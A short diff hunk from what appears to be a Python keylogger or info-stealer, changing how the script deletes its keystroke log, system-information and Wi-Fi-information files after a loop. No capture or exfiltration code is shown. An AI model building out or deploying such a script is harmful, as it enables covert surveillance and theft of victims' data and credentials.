@@ -150,5 +150,5 @@ while iterations == iterations_end:
 
 os.remove(key_log)
 os.remove(system_information)
-os.remove(get_wifiInfo())
+os.remove(wifiInfo)
 
